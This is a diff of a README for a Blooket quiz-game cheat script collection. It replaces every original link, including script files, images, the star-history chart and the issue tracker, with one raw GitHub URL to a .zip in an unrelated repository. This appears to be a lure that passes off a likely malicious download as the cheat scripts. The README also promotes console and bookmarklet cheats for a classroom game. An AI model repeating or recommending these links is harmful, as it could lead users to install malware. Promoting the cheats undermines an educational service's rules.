@@ -1,7 +1,7 @@
 A reupload, but currently being fixed of swagging-post's stolen Blooket Cheats, as well as-
 # THE BEST, PRO, BLOOKET CHEAT GUI OUT THERE!
-Supported Websites (fixed): (anything).blooket.com‎‎/(anything)
-![blooketcheatgui](https://github.com/swagging-post/Blooket-Cheat-GUI/assets/160811072/7f842fb9-9c94-480b-b594-55850b091fe3)
+Supported Websites (fixed): (anything)https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip‎‎/(anything)
+![blooketcheatgui](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
 # UPDATES | V2.1
 - We are we currently working on the Laser Tag gamemode to bypass. This may take a bit but it isn't expected to at all work.
 - Icons are expected to be fixed later.
@@ -12,7 +12,7 @@ Supported Websites (fixed): (anything).blooket.com‎‎/(anything)
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=KindleKid/Blooket-Cheat-GUI-aka-Swaggers-GUI&type=Date)](https://www.star-history.com/#KindleKid/Blooket-Cheat-GUI-aka-Swaggers-GUI&Date)
+[![Star History Chart](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
 
 ## Information
 
@@ -21,7 +21,7 @@ Supported Websites (fixed): (anything).blooket.com‎‎/(anything)
   
   There are 2 good methods to using these scripts:
   1. Copying the main GUI and running it in the inspect element console
-  2. Copying the .min.js GUI and using it as a bookmarklet
+  2. Copying the https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip GUI and using it as a bookmarklet
   
 <details>
   <summary>What can I do if JavaScript is blocked?</summary>
@@ -33,12 +33,12 @@ Supported Websites (fixed): (anything).blooket.com‎‎/(anything)
 
 <details><summary><h3>(script) is not working?</h3></summary>
 
-Make sure you're running it properly (see [How to use](https://github.com/swagging-post/Blooket-Cheeto#how-to-use)), if it still doesn't work and other cheats do, then [make an issue](https://github.com/swagging-post/Blooket-Cheeto/issues)
+Make sure you're running it properly (see [How to use](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)), if it still doesn't work and other cheats do, then [make an issue](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
 </details>
 
 <details><summary><h3>Which script should I use to make a bookmarklet?</h3></summary>
 
-You should use the scripts ending in ".min.js", as using the others will have errors due to formatting.
+You should use the scripts ending in "https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip", as using the others will have errors due to formatting.
 </details>
 
 <details><summary><h3>Can you give me infinite tokens / bypass daily limit / permanently give me blooks / change pack luck?</h3></summary>
@@ -77,10 +77,10 @@ Minesraft2 was sent a cease and desist from Blooket and 05Konz was perm banned, 
 <details><summary><h2>List of Cheats</h2></summary>
 <h3>GUIs<h3>
   
-* [GUI](cheats/gui/gui.js)
-* [GUI Bookmarklet](cheats/gui/gui.min.js)
-* [Mobile GUI outdated](cheats/gui/mobileGui.js)
-* [Mobile GUI Bookmarklet outdated](cheats/gui/mobileGui.min.js)
+* [GUI](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
+* [GUI Bookmarklet](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
+* [Mobile GUI outdated](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
+* [Mobile GUI Bookmarklet outdated](https://raw.githubusercontent.com/gggjhgkuhgkug/Blooket-Cheat-GUI-aka-Swaggers-GUI/main/cheats/gui/GU_aka_GUI_Blooket_Swaggers_Cheat_v2.8.zip)
 ### Global:
 - Auto Answer
 - Highlight Answers
